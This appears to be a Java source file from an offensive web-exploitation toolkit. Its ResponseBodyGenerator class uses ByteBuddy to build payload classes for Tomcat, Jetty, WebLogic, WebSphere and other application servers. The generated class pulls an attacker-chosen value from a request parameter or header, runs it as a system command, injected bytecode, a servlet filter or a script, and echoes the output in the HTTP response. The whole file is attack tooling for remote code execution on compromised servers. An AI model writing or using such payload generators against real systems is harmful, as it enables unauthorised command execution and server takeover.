package com.reajason.javaweb.probe.generator.response;

import com.reajason.javaweb.GenerationException;
import com.reajason.javaweb.Server;
import com.reajason.javaweb.buddy.MethodCallReplaceVisitorWrapper;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.probe.ProbeContent;
import com.reajason.javaweb.probe.config.ProbeConfig;
import com.reajason.javaweb.probe.config.ResponseBodyConfig;
import com.reajason.javaweb.probe.generator.ByteBuddyShellGenerator;
import com.reajason.javaweb.probe.payload.ByteCodeProbe;
import com.reajason.javaweb.probe.payload.CommandProbe;
import com.reajason.javaweb.probe.payload.FilterProbeFactory;
import com.reajason.javaweb.probe.payload.ScriptEngineProbe;
import com.reajason.javaweb.probe.payload.response.*;
import com.reajason.javaweb.utils.ShellCommonUtil;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.asm.Advice;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.implementation.FixedValue;
import org.apache.commons.lang3.StringUtils;

import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import static java.nio.charset.StandardCharsets.UTF_8;
import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2025/6/29
 */
public class ResponseBodyGenerator extends ByteBuddyShellGenerator<ResponseBodyConfig> {
    private static final Map<String, Class<?>> WRITER_CLASSES = createWriterClasses();

    public ResponseBodyGenerator(ProbeConfig probeConfig, ResponseBodyConfig probeContentConfig) {
        super(probeConfig, probeContentConfig);
    }

    public static List<String> getSupportedServers() {
        return new ArrayList<>(WRITER_CLASSES.keySet());
    }

    @Override
    protected DynamicType.Builder<?> build(ByteBuddy buddy) {
        Class<?> getDataFromReqInterceptor = getDataFromReqInterceptor.class;
        String server = probeContentConfig.getServer();
        if (Server.Jetty.equals(server)) {
            getDataFromReqInterceptor = getDataFromReqJettyInterceptor.class;
        }
        if (ProbeContent.Filter.equals(probeConfig.getProbeContent())) {
            probeContentConfig.setBase64Bytes(FilterProbeFactory.getBase64ByServer(server));
        }
        Class<?> writerClass = getWriterClass();
        Class<?> runnerClass = getRunnerClass();
        DynamicType.Builder<?> builder = buddy.redefine(writerClass)
                .name(probeConfig.getShellClassName())
                .visit(new TargetJreVersionVisitorWrapper(probeConfig.getTargetJreVersion()))
                .visit(Advice.withCustomMapping()
                        .bind(ValueAnnotation.class, probeContentConfig.getCommandTemplate())
                        .to(runnerClass)
                        .on(named("run")));
        String base64Bytes = probeContentConfig.getBase64Bytes();
        if (StringUtils.isNotBlank(base64Bytes)) {
            builder = builder.method(named("getDataFromReq")).intercept(FixedValue.value(base64Bytes));
        } else {
            builder = builder.visit(MethodCallReplaceVisitorWrapper.newInstance("getDataFromReq",
                            probeConfig.getShellClassName(), ShellCommonUtil.class.getName()))
                    .visit(Advice.withCustomMapping().bind(ValueAnnotation.class, probeContentConfig.getReqParamName())
                            .to(getDataFromReqInterceptor).on(named("getDataFromReq")));
        }
        return builder;
    }

    private Class<?> getRunnerClass() {
        switch (probeConfig.getProbeContent()) {
            case Command:
                return CommandProbe.class;
            case Bytecode:
            case Filter:
                return ByteCodeProbe.class;
            case ScriptEngine:
                return ScriptEngineProbe.class;
            default:
                throw new GenerationException("responseBody not supported for probe content: " + probeConfig.getProbeContent());
        }
    }

    private Class<?> getWriterClass() {
        Class<?> writerClass = WRITER_CLASSES.get(probeContentConfig.getServer());
        if (writerClass == null) {
            throw new GenerationException("responseBody not supported for server: " + probeContentConfig.getServer());
        }
        return writerClass;
    }

    private static Map<String, Class<?>> createWriterClasses() {
        Map<String, Class<?>> writerClasses = new LinkedHashMap<>();
        writerClasses.put(Server.Tomcat, TomcatWriter.class);
        writerClasses.put(Server.Jetty, JettyWriter.class);
        writerClasses.put(Server.Jetty5, JettyWriter.class);
        writerClasses.put(Server.Undertow, UndertowWriter.class);
        writerClasses.put(Server.JBoss, TomcatWriter.class);
        writerClasses.put(Server.Resin, ResinWriter.class);
        writerClasses.put(Server.Resin2, Resin2Writer.class);
        writerClasses.put(Server.WebLogic, WebLogicWriter.class);
        writerClasses.put(Server.WebSphere, WebSphereWriter.class);
        writerClasses.put(Server.GlassFish, GlassFishWriter.class);
        writerClasses.put(Server.TongWeb, TongWebWriter.class);
        writerClasses.put(Server.BES, TomcatWriter.class);
        writerClasses.put(Server.InforSuite, GlassFishWriter.class);
        writerClasses.put(Server.Apusic, ApusicWriter.class);
        writerClasses.put(Server.SpringWebMvc, SpringWebMvcWriter.class);
        writerClasses.put(Server.Struts2, Struts2Writer.class);
        return writerClasses;
    }

    static class getDataFromReqInterceptor {
        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(value = 0) Object request,
                                 @ValueAnnotation String name,
                                 @Advice.Return(readOnly = false) String ret) throws Exception {
            String p = null;
            try {
                p = (String) ShellCommonUtil.invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{name});
            } catch (Exception ignored) {
            }
            if (p == null || p.isEmpty()) {
                try {
                    p = (String) ShellCommonUtil.invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{name});
                } catch (Exception ignored) {
                }
            }
            if (p == null || p.isEmpty()) {
                try {
                    p = (String) ShellCommonUtil.invokeMethod(request, "getField", new Class[]{String.class}, new Object[]{name});
                } catch (Exception ignored) {
                }
            }
            ret = p;
        }
    }

    static class getDataFromReqJettyInterceptor {
        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(value = 0) Object request,
                                 @ValueAnnotation String name,
                                 @Advice.Return(readOnly = false) String ret) throws Exception {
            String p = null;
            try {
                p = (String) ShellCommonUtil.invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{name});
            } catch (Exception e) {
            }
            if (p == null || p.isEmpty()) {
                try {
                    p = (String) ShellCommonUtil.invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{name});
                } catch (Exception ignored) {
                }
            }
            if (p == null || p.isEmpty()) {
                try {
                    p = (String) ShellCommonUtil.invokeMethod(request, "getField", new Class[]{String.class}, new Object[]{name});
                } catch (Exception ignored) {
                }
            }
            if (p == null || p.isEmpty()) {
                Class<?> requestClass = request.getClass().getClassLoader().loadClass("org.eclipse.jetty.server.Request");
                Object parameters = requestClass.getMethod("extractQueryParameters", requestClass, Charset.class).invoke(null, request, UTF_8);
                p = (String) ShellCommonUtil.invokeMethod(parameters, "getValue", new Class[]{String.class}, new Object[]{name});
            }
            if (p == null || p.isEmpty()) {
                Object headers = ShellCommonUtil.invokeMethod(request, "getHeaders", null, null);
                p = (String) ShellCommonUtil.invokeMethod(headers, "get", new Class[]{String.class}, new Object[]{name});
            }
            ret = p;
        }
    }

    @Retention(RetentionPolicy.RUNTIME)
    public @interface ValueAnnotation {
    }
}
